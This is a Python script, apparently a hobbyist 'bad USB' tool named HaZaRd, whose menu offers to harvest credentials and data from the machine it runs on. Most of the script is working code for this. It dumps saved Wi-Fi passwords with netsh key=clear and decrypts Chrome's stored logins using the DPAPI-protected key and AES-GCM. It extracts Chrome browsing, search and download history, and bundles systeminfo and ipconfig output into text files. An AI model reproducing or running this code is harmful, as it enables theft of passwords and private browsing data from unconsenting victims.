#HaZaRd

#imported Library
import subprocess
import os
import re
import sqlite3
from rich import *
from rich.progress import Progress
from time import *
from random import *
from pystyle import *
from rich.console import Console
from rich.highlighter import Highlighter
import json
from base64 import b64decode
import win32crypt
import sqlite3 
import shutil
from Crypto.Cipher import AES

console = Console()


#Appearance menu
os.system('cmd /c "cls"')
print("                                                         v 1.1")
print("                                    [green]██╗  ██╗ █████╗ ███████╗ █████╗ ██████╗ ██████╗              [/green][yellow]for[/yellow] [magenta]Woman[/magenta] [cyan]life[/cyan] [red]freedom")
print(" [green]free copy![/green]                         [green]██║  ██║██╔══██╗╚══███╔╝██╔══██╗██╔══██╗██╔══██╗              ")
print(" [green]created by:[/green] [yellow]HaZaRd#4058[/yellow][white]            ███████║███████║  ██[/white][yellow]█╔╝ █████[/yellow][white]██║██████╔╝██║  ██║  " )
print(" [red]App for bad USB![/red][white]                   ██╔══██║██╔══██║ ███[/white][yellow]╔╝  ██╔[/yellow][white]══██║██╔══██╗██║  ██║")
print("                                    [red]██║  ██║██║  ██║███████╗██║  ██║██║  ██║██████╔╝")
print("                                    [red]╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ")



class RainbowHighlighter(Highlighter):
    def highlight(self, text):  
        for index in range(len(text)):
            text.stylize(f"color({randint(12, 255)})", index, index + 1)


rainbow = RainbowHighlighter()
print(rainbow("                                                      IRAN ON TOP!"))


Write.Print("**free exit: ALT + F4**", Colors.blue_to_cyan, interval=0.02)

print()
Write.Print("------------------------------------------------------------------------------------------------------------------------\n", Colors.blue, interval=0.02)
print("║[blue]01[/blue]║ : copy router pass                                     ║[blue]09[/blue]║ : free all copy")
print("║[blue]02[/blue]║ : google pass copy                                     ║[blue]10[/blue]║ : help")
print("║[blue]03[/blue]║ : google history copy                                  ║[blue]11[/blue]║ : about")
print("║[blue]04[/blue]║ : windows pass copy (beta)                             ║[blue]12[/blue]║ : contact us")
print("║[blue]05[/blue]║ : windows copy information                                ")
print("║[blue]06[/blue]║ : ipconfig copy                                 ")
print("║[blue]07[/blue]║ : make txt file for save                     ")
print("║[blue]08[/blue]║ : connect to wifi                                  ")
ss = input ("--->")


#ss = Number database


#Copy the saved Wi-Fi script
if ss == "1":
 netsh_output = subprocess.run(
     ["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()

 profile_names = (re.findall("All User Profile     : (.*)\r", netsh_output))

 wifi_list = []

 if len(profile_names) != 0:
     for name in profile_names:

        wifi_profile = {}

        profile_info = subprocess.run(
            ["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name
            profile_info_pass = subprocess.run(
                ["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
            password = re.search(
                "Key Content            : (.*)\r", profile_info_pass)
            if password == None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]

            wifi_list.append(wifi_profile)


     print(wifi_list)

 b= f"----hazard----pas c is ok:                                         {wifi_list}                                   godby god b/g\n"

 print("01: save")
 print("02: Exit")
 a = input ("-->")
 if a == "2":
    exit()

# save a password in txt file
 elif a == "1":
    
    file = open("pas save.txt","w")
    file.write(b)
    print("[green]pass is save")
    file.close()
    sleep(5)
 else:
     print("[red]ERROR:|",sleep(10),exit())
elif ss == "2":
 f = open("C:\\Users\\pro\\AppData\\Local\\Google\\Chrome\\User Data\\Local State")
 local_state = json.loads(f.read())

 key = local_state["os_crypt"]["encrypted_key"]

#  1
 key = b64decode(key) # Base 64 Decoder
 key = key[5:]
#  2
 key = win32crypt.CryptUnprotectData(key)[1]
###########################################
 path = "C:\\Users\\pro\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"
 shutil.copy(path+"Login Data" , path+"database2") # Copy Database

 database = sqlite3.connect(path+"database2")
 cursor = database.cursor()

 cursor.execute("select origin_url , username_value , password_value from logins")

 result = cursor.fetchall()

 def decrypt(password , key):
    iv = password[3:15]
    password = password[15:]
    
    cipher = AES.new(key , AES.MODE_GCM , iv)
    password = cipher.decrypt(password)
    password = password[:-16].decode()
    return password


 for i in result:
    url = i[0]
    username = i[1]
    password = decrypt(i[2] , key)
    print("{} : ".format(url))
    print("\tusername : {}".format(username))
    print("\tpassword : {}".format(password))
    print()

 sleep(10)
elif ss == "3":

 if os.system("uname > /dev/null") == 0 : # OS IS LINUX
    db_path = os.getenv("HOME") + "/.config/google-chrome/Default/History"
 else : # OS IS WINDOWS
    appdata = os.getenv("appdata").replace("\\Roaming","")
    db_path = appdata + "\\Local\\Google\\Chrome\\User Data\\Default\\History"

 db = sqlite3.connect(db_path)
 c = db.cursor()

# SEARCH History
 searchs = []
 c.execute("select term from keyword_search_terms")
 for item in c.fetchall():
    searchs.append(item[0])

# URL HISTORY
 urls = []
 c.execute("select url from urls")
 for item in c.fetchall():
     urls.append(item[0])

 # Download HISTORY :
 downloads = []
 c.execute("select tab_url from downloads")
 for item in c.fetchall():
    downloads.append(item[0])

## SHOW Information ##
 print("Urls : ")
 for url in urls:
    print("\t{}".format(url))

 print("-"*50)

 print("Downloaded Files :")
 for download in downloads:
    print("\t{}".format(download))

 print("-"*50)

 print("Searchs : ")
 for search in searchs:
    print("\t{}".format(search))
    sleep(10)
elif ss == "4":
    pass

#windows copy information
elif ss == "5":
#set code in cmd or shell
 command_one = "SystemInfo"
 sys = subprocess.check_output(command_one).decode()
#print info
 print(f"[yellow]{sys}")

 Write.Print("""01:save
""", Colors.orange, interval=0.02)
 Write.Print("02:exit", Colors.orange, interval=0.02)
 input = input("""
 --->""")
#save a info in txt file
 if input == "1":
     file = open("sys info.txt","w")
     file.write(sys)
     file.close()
     print("[green]info save:)")



#ipconfig copy -- Copy network card information
elif ss == "6":
#set a cammand in cmd or shell(ipconfig)
    ipsc = subprocess.check_output("ipconfig").decode()
    print(ipsc)
    print("01:save")
    print("02:exit")
    ips = input("--->")
#save a info in txt file
    if ips == "1":
        file = open("ipsave.txt","w")
        file.write(ipsc)
        file.close
    else:
      exit()
#make a text file for save
elif ss == "7": 
    file = open("pas save.txt","x")

#connect to wifi
elif ss == "8":
#set a command in cmd or shell(netsh wlan show networks)
 os.system('cmd /c "netsh wlan show networks"')
#Get the desired Wi-Fi name
 name_of_router = input('name wifi --->')
#set a command in cmd or shell(netsh wlan connect name="wifi name")
 os.system(f'''cmd /c "netsh wlan connect name="{name_of_router}"''')
 print("ok!")

#free all copy
#We have included all parts of the program in this section
elif ss == "9":

 with Progress() as progress:

    task1 = progress.add_task("[red]Run...", total=100)

    while not progress.finished:
        progress.update(task1, advance=0.5)

        sleep(0.02)

 netsh_output = subprocess.run(
     ["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()

 profile_names = (re.findall("All User Profile     : (.*)\r", netsh_output))

 wifi_list = []

 if len(profile_names) != 0:
     for name in profile_names:

        wifi_profile = {}

        profile_info = subprocess.run(
            ["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name
            profile_info_pass = subprocess.run(
                ["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
            password = re.search(
                "Key Content            : (.*)\r", profile_info_pass)
            if password == None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]

            wifi_list.append(wifi_profile)
 b= f"pas c is ok:                                         {wifi_list}                                  HaZaRd godby god b/g\n" 
 print("[green]wifi is save")
 ipsc = subprocess.check_output("ipconfig").decode()
 sp = "\n"
 print("[green]ipconfig is save")
 command_one = "SystemInfo"
 sys = subprocess.check_output(command_one).decode()

 print("[green]sys info is save")
 file = open("all save.txt","w")
 file.write(b+ipsc+sp+sys)
 file.close()
 
 sleep(0.5)


elif ss == "10":
    print("start w: search pas hotspot")
    print("start l: search pas for LAN cable")
    print ("[green]To use this app")
    print ("[green]First you need to press the 1 or 2 key")
    print ("[green]Then after some time the programs will be shown to you")
    print ("[green]If you want to save them in a text file")
    print ("After displaying the passwords")
    print ("Press the 3 key")
    print ("If you do not do this, you will encounter an error")
    print ("After pressing the T button and hitting enter")
    print ("[red]A file is created")
    print ("[red]Then you have to press the S key to save the file")
    print ("[red]Stay tuned for future releases!")
    print("[red]#MAHSA_AMINI" )
    print("")
    print("godby g/b",sleep(30),exit())
elif ss=="11":
    
    print ("[green]Year of construction:2023")
    print ("[green]Manufacturer Name:!?")
    print ("Version:1.1")
    console.print("License: No license", style="blink bold red underline on white")
    print ("Condition:update!")
    print ("Manufacturer:ARD™")
    
    console.print("Copyright:Prosecution", style="blink bold red underline on white")
    print ("[red]Compatible operating systems:Windows and Linux")
    print("godby g/b",sleep(30),exit())

elif ss == "12":
    print("[yellow]Email[/yellow]: [magenta]iliapolice123456789@gmail.com[/magenta]")
    sleep(6)
else:
    print("[white]WTF[/white]([green]&[/green]_[green]&[/green])")
    sleep(2)

#discord





#  __    __  ______  ________  ______  _______  _______  
# |  \  |  \/      \|        \/      \|       \|       \ 
# | ▓▓  | ▓▓  ▓▓▓▓▓▓\\▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓\ ▓▓▓▓▓▓▓\ ▓▓▓▓▓▓▓\
# | ▓▓__| ▓▓ ▓▓__| ▓▓   /  ▓▓| ▓▓__| ▓▓ ▓▓__| ▓▓ ▓▓  | ▓▓
# | ▓▓    ▓▓ ▓▓    ▓▓  /  ▓▓ | ▓▓    ▓▓ ▓▓    ▓▓ ▓▓  | ▓▓
# | ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓ /  ▓▓  | ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓\ ▓▓  | ▓▓
# | ▓▓  | ▓▓ ▓▓  | ▓▓/  ▓▓___| ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓__/ ▓▓
# | ▓▓  | ▓▓ ▓▓  | ▓▓  ▓▓    \ ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓    ▓▓    
#  \▓▓   \▓▓\▓▓   \▓▓\▓▓▓▓▓▓▓▓\▓▓   \▓▓\▓▓   \▓▓\▓▓▓▓▓▓▓ 
                                                       
                                                       
                                                       
# ───▄█▌─▄─▄─▐█▄
# ───██▌▀▀▄▀▀▐██
# ───██▌─▄▄▄─▐██
# ───▀██▌▐█▌▐██▀
# ▄██████─▀─██████▄
